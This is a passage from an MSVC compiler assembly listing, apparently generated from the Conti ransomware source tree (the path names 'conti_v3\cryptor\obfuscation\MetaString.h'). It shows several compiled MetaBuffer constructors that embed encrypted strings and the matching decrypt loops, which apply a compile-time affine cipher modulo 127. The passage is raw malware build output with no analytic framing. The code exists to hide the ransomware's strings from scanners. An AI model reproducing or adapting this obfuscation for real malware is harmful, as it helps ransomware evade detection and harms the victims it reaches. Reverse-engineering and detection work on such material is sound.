  00037	41 f7 e8	 imul	 r8d
  0003a	41 03 d0	 add	 edx, r8d
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	44 2b c0	 sub	 r8d, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00056	41 f7 e8	 imul	 r8d
  00059	41 03 d0	 add	 edx, r8d
  0005c	c1 fa 06	 sar	 edx, 6
  0005f	8b c2		 mov	 eax, edx
  00061	c1 e8 1f	 shr	 eax, 31
  00064	03 d0		 add	 edx, eax
  00066	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00069	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006c	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00070	49 83 eb 01	 sub	 r11, 1
  00074	75 aa		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00076	49 8b c1	 mov	 rax, r9
  00079	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 36	 mov	 BYTE PTR [rcx+1], 54	; 00000036H
  00007	c6 41 02 3c	 mov	 BYTE PTR [rcx+2], 60	; 0000003cH
  0000b	c6 41 03 39	 mov	 BYTE PTR [rcx+3], 57	; 00000039H
  0000f	c6 41 04 3c	 mov	 BYTE PTR [rcx+4], 60	; 0000003cH
  00013	c6 41 05 47	 mov	 BYTE PTR [rcx+5], 71	; 00000047H
  00017	c6 41 06 3c	 mov	 BYTE PTR [rcx+6], 60	; 0000003cH
  0001b	c6 41 07 66	 mov	 BYTE PTR [rcx+7], 102	; 00000066H
  0001f	c6 41 08 3c	 mov	 BYTE PTR [rcx+8], 60	; 0000003cH
  00023	c6 41 09 61	 mov	 BYTE PTR [rcx+9], 97	; 00000061H
  00027	c6 41 0a 3c	 mov	 BYTE PTR [rcx+10], 60	; 0000003cH
  0002b	c6 41 0b 72	 mov	 BYTE PTR [rcx+11], 114	; 00000072H
  0002f	c6 41 0c 3c	 mov	 BYTE PTR [rcx+12], 60	; 0000003cH
  00033	c6 41 0d 6c	 mov	 BYTE PTR [rcx+13], 108	; 0000006cH
  00037	c6 41 0e 3c	 mov	 BYTE PTR [rcx+14], 60	; 0000003cH
  0003b	c6 41 0f 2e	 mov	 BYTE PTR [rcx+15], 46	; 0000002eH
  0003f	c6 41 10 3c	 mov	 BYTE PTR [rcx+16], 60	; 0000003cH
  00043	c6 41 11 20	 mov	 BYTE PTR [rcx+17], 32	; 00000020H
  00047	c6 41 12 3c	 mov	 BYTE PTR [rcx+18], 60	; 0000003cH
  0004b	c6 41 13 39	 mov	 BYTE PTR [rcx+19], 57	; 00000039H
  0004f	c6 41 14 3c	 mov	 BYTE PTR [rcx+20], 60	; 0000003cH
  00053	c6 41 15 61	 mov	 BYTE PTR [rcx+21], 97	; 00000061H
  00057	c6 41 16 3c	 mov	 BYTE PTR [rcx+22], 60	; 0000003cH
  0005b	c6 41 17 20	 mov	 BYTE PTR [rcx+23], 32	; 00000020H
  0005f	c6 41 18 3c	 mov	 BYTE PTR [rcx+24], 60	; 0000003cH
  00063	c6 41 19 72	 mov	 BYTE PTR [rcx+25], 114	; 00000072H
  00067	c6 41 1a 3c	 mov	 BYTE PTR [rcx+26], 60	; 0000003cH
  0006b	c6 41 1b 07	 mov	 BYTE PTR [rcx+27], 7
  0006f	c6 41 1c 3c	 mov	 BYTE PTR [rcx+28], 60	; 0000003cH
  00073	c6 41 1d 21	 mov	 BYTE PTR [rcx+29], 33	; 00000021H
  00077	c6 41 1e 3c	 mov	 BYTE PTR [rcx+30], 60	; 0000003cH
  0007b	c6 41 1f 72	 mov	 BYTE PTR [rcx+31], 114	; 00000072H
  0007f	c6 41 20 3c	 mov	 BYTE PTR [rcx+32], 60	; 0000003cH
  00083	c6 41 21 6c	 mov	 BYTE PTR [rcx+33], 108	; 0000006cH
  00087	c6 41 22 3c	 mov	 BYTE PTR [rcx+34], 60	; 0000003cH
  0008b	c6 41 23 21	 mov	 BYTE PTR [rcx+35], 33	; 00000021H
  0008f	c6 41 24 3c	 mov	 BYTE PTR [rcx+36], 60	; 0000003cH
  00093	c6 41 25 6d	 mov	 BYTE PTR [rcx+37], 109	; 0000006dH
  00097	c6 41 26 3c	 mov	 BYTE PTR [rcx+38], 60	; 0000003cH
  0009b	c6 41 27 7a	 mov	 BYTE PTR [rcx+39], 122	; 0000007aH
  0009f	c6 41 28 3c	 mov	 BYTE PTR [rcx+40], 60	; 0000003cH
  000a3	c6 41 29 14	 mov	 BYTE PTR [rcx+41], 20
  000a7	c6 41 2a 3c	 mov	 BYTE PTR [rcx+42], 60	; 0000003cH
  000ab	c6 41 2b 20	 mov	 BYTE PTR [rcx+43], 32	; 00000020H
  000af	c6 41 2c 3c	 mov	 BYTE PTR [rcx+44], 60	; 0000003cH
  000b3	c6 41 2d 61	 mov	 BYTE PTR [rcx+45], 97	; 00000061H
  000b7	c6 41 2e 3c	 mov	 BYTE PTR [rcx+46], 60	; 0000003cH
  000bb	c6 41 2f 07	 mov	 BYTE PTR [rcx+47], 7
  000bf	c6 41 30 3c	 mov	 BYTE PTR [rcx+48], 60	; 0000003cH
  000c3	c6 41 31 21	 mov	 BYTE PTR [rcx+49], 33	; 00000021H
  000c7	c6 41 32 3c	 mov	 BYTE PTR [rcx+50], 60	; 0000003cH
  000cb	c6 41 33 47	 mov	 BYTE PTR [rcx+51], 71	; 00000047H
  000cf	c6 41 34 3c	 mov	 BYTE PTR [rcx+52], 60	; 0000003cH
  000d3	c6 41 35 72	 mov	 BYTE PTR [rcx+53], 114	; 00000072H
  000d7	c6 41 36 3c	 mov	 BYTE PTR [rcx+54], 60	; 0000003cH
  000db	c6 41 37 7a	 mov	 BYTE PTR [rcx+55], 122	; 0000007aH
  000df	c6 41 38 3c	 mov	 BYTE PTR [rcx+56], 60	; 0000003cH
  000e3	c6 41 39 21	 mov	 BYTE PTR [rcx+57], 33	; 00000021H
  000e7	c6 41 3a 3c	 mov	 BYTE PTR [rcx+58], 60	; 0000003cH
  000eb	c6 41 3b 2e	 mov	 BYTE PTR [rcx+59], 46	; 0000002eH
  000ef	c6 41 3c 3c	 mov	 BYTE PTR [rcx+60], 60	; 0000003cH
  000f3	c6 41 3d 61	 mov	 BYTE PTR [rcx+61], 97	; 00000061H
  000f7	c6 41 3e 3c	 mov	 BYTE PTR [rcx+62], 60	; 0000003cH
  000fb	c6 41 3f 5a	 mov	 BYTE PTR [rcx+63], 90	; 0000005aH
  000ff	c6 41 40 3c	 mov	 BYTE PTR [rcx+64], 60	; 0000003cH
  00103	c6 41 41 3c	 mov	 BYTE PTR [rcx+65], 60	; 0000003cH
  00107	c6 41 42 3c	 mov	 BYTE PTR [rcx+66], 60	; 0000003cH
  0010b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0010f	48 8b c1	 mov	 rax, rcx
  00112	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 2a 00 00
	00		 mov	 r11d, 42		; 0000002aH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6b	 sub	 ecx, 107		; 0000006bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3c	 mov	 BYTE PTR [rcx+1], 60	; 0000003cH
  00007	c6 41 02 6b	 mov	 BYTE PTR [rcx+2], 107	; 0000006bH
  0000b	c6 41 03 14	 mov	 BYTE PTR [rcx+3], 20
  0000f	c6 41 04 6b	 mov	 BYTE PTR [rcx+4], 107	; 0000006bH
  00013	c6 41 05 2d	 mov	 BYTE PTR [rcx+5], 45	; 0000002dH
  00017	c6 41 06 6b	 mov	 BYTE PTR [rcx+6], 107	; 0000006bH
  0001b	c6 41 07 37	 mov	 BYTE PTR [rcx+7], 55	; 00000037H
  0001f	c6 41 08 6b	 mov	 BYTE PTR [rcx+8], 107	; 0000006bH
  00023	c6 41 09 25	 mov	 BYTE PTR [rcx+9], 37	; 00000025H
  00027	c6 41 0a 6b	 mov	 BYTE PTR [rcx+10], 107	; 0000006bH
  0002b	c6 41 0b 16	 mov	 BYTE PTR [rcx+11], 22
  0002f	c6 41 0c 6b	 mov	 BYTE PTR [rcx+12], 107	; 0000006bH
  00033	c6 41 0d 0c	 mov	 BYTE PTR [rcx+13], 12
  00037	c6 41 0e 6b	 mov	 BYTE PTR [rcx+14], 107	; 0000006bH
  0003b	c6 41 0f 39	 mov	 BYTE PTR [rcx+15], 57	; 00000039H
  0003f	c6 41 10 6b	 mov	 BYTE PTR [rcx+16], 107	; 0000006bH
  00043	c6 41 11 25	 mov	 BYTE PTR [rcx+17], 37	; 00000025H
  00047	c6 41 12 6b	 mov	 BYTE PTR [rcx+18], 107	; 0000006bH
  0004b	c6 41 13 16	 mov	 BYTE PTR [rcx+19], 22
  0004f	c6 41 14 6b	 mov	 BYTE PTR [rcx+20], 107	; 0000006bH
  00053	c6 41 15 3c	 mov	 BYTE PTR [rcx+21], 60	; 0000003cH
  00057	c6 41 16 6b	 mov	 BYTE PTR [rcx+22], 107	; 0000006bH
  0005b	c6 41 17 56	 mov	 BYTE PTR [rcx+23], 86	; 00000056H
  0005f	c6 41 18 6b	 mov	 BYTE PTR [rcx+24], 107	; 0000006bH
  00063	c6 41 19 2d	 mov	 BYTE PTR [rcx+25], 45	; 0000002dH
  00067	c6 41 1a 6b	 mov	 BYTE PTR [rcx+26], 107	; 0000006bH
  0006b	c6 41 1b 2d	 mov	 BYTE PTR [rcx+27], 45	; 0000002dH
  0006f	c6 41 1c 6b	 mov	 BYTE PTR [rcx+28], 107	; 0000006bH
  00073	c6 41 1d 39	 mov	 BYTE PTR [rcx+29], 57	; 00000039H
  00077	c6 41 1e 6b	 mov	 BYTE PTR [rcx+30], 107	; 0000006bH
  0007b	c6 41 1f 66	 mov	 BYTE PTR [rcx+31], 102	; 00000066H
  0007f	c6 41 20 6b	 mov	 BYTE PTR [rcx+32], 107	; 0000006bH
  00083	c6 41 21 25	 mov	 BYTE PTR [rcx+33], 37	; 00000025H
  00087	c6 41 22 6b	 mov	 BYTE PTR [rcx+34], 107	; 0000006bH
  0008b	c6 41 23 0f	 mov	 BYTE PTR [rcx+35], 15
  0008f	c6 41 24 6b	 mov	 BYTE PTR [rcx+36], 107	; 0000006bH
  00093	c6 41 25 4a	 mov	 BYTE PTR [rcx+37], 74	; 0000004aH
  00097	c6 41 26 6b	 mov	 BYTE PTR [rcx+38], 107	; 0000006bH
  0009b	c6 41 27 58	 mov	 BYTE PTR [rcx+39], 88	; 00000058H
  0009f	c6 41 28 6b	 mov	 BYTE PTR [rcx+40], 107	; 0000006bH
  000a3	c6 41 29 6b	 mov	 BYTE PTR [rcx+41], 107	; 0000006bH
  000a7	c6 41 2a 6b	 mov	 BYTE PTR [rcx+42], 107	; 0000006bH
  000ab	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000af	48 8b c1	 mov	 rax, rcx
  000b2	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 3a 00 00
	00		 mov	 r11d, 58		; 0000003aH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 38	 sub	 ecx, 56			; 00000038H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
